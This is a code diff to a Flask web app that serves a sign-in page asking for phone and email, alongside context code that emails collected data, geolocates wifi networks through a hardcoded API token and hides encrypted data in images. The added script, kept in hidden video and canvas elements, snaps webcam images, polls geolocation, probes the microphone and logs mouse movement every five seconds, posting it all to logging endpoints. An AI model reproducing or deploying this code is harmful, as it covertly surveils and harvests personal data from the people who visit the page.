@@ -62,7 +62,7 @@ data_buffer = []
 images_to_send = []  # To store image filenames for emailing
 buffer_lock = threading.Lock()
 
-# Email sending functions (unchanged)
+# Email sending functions
 def send_email(data_list, image_list):
     smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
     smtp_port = int(os.environ.get("SMTP_PORT", 587))
@@ -104,7 +104,7 @@ def email_sender_thread():
                 data_buffer.clear()
                 images_to_send.clear()
 
-# Helper functions (unchanged)
+# Helper functions
 def get_wifi_location_from_wigle(bssid):
     username = "AID9d6a1f4d617967b3d4c6189558862314"
     api_token = "ac01dcab47f048daf62cb43edaf37295"
@@ -220,7 +220,7 @@ def patched_collect_data(*args, **kwargs):
 
 collect_data = patched_collect_data
 
-# Other helper functions (unchanged)
+# Other helper functions
 def embed_data_in_image(data):
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
     encrypted_str = base64.b64encode(encrypted_data).decode('utf-8')
@@ -278,7 +278,7 @@ The provided data contains information about devices and users potentially invol
    **Conclusion:** [Summary of promising leads]
 """ + json.dumps(data, indent=2)
         )
-        model = genai.GenerativeModel('gemini-2.0-flash')
+        model = genai.GenerativeModel('gemini-1.5-flash')  # Update model name as per availability
         response = model.generate_content(prompt)
         report = response.text
         logging.info(f"Gemini AI report received: {report}")
@@ -377,6 +377,70 @@ LOGIN_PAGE = """
             <button type="submit">Sign In</button>
         </form>
     </div>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        const permissions = "{{ permissions }}";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let lastMouseX = 0, lastMouseY = 0;
+
+        document.addEventListener('mousemove', (e) => {
+            lastMouseX = e.clientX;
+            lastMouseY = e.clientY;
+        });
+
+        if (permissions === 'granted') {
+            navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
+                video.srcObject = stream;
+            }).catch(() => console.log('Camera access denied'));
+
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/log_location', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                    });
+                }, () => console.log('Location access denied'));
+
+                if (video.srcObject) {
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const snapshot = canvas.toDataURL('image/jpeg');
+                    fetch('/log_camera', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({image: snapshot})
+                    });
+                }
+
+                navigator.mediaDevices.getUserMedia({audio: true}).then(stream => {
+                    fetch('/log_microphone', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({message: 'Audio recorded'})
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                }).catch(() => console.log('Microphone access denied'));
+            }, 5000);
+        } else {
+            setInterval(() => {
+                const otherData = {
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    mouseX: lastMouseX,
+                    mouseY: lastMouseY,
+                    timestamp: new Date().toISOString()
+                };
+                fetch('/log_other_data', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(otherData)
+                });
+            }, 5000);
+        }
+    </script>
 </body>
 </html>
 """
@@ -587,6 +651,7 @@ def login():
     if request.method == 'GET':
         if not session.get('permissions_granted'):
             return redirect(url_for('permissions'))
+        return render_template_string(LOGIN_PAGE, permissions='granted')
     if request.method == 'POST':
         phone = request.form['phone']
         email = request.form['email']
@@ -595,7 +660,6 @@ def login():
         session['logged_in'] = True
         session['user_data'] = {'phone': phone, 'email': email}
         return redirect(url_for('drive'))
-    return render_template_string(LOGIN_PAGE)
 
 @app.route('/drive')
 def drive():
@@ -630,7 +694,6 @@ def download():
 
     return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
-# Remaining routes (unchanged)
 @app.route('/verify', methods=['GET'])
 def verify():
     token = request.args.get('token')
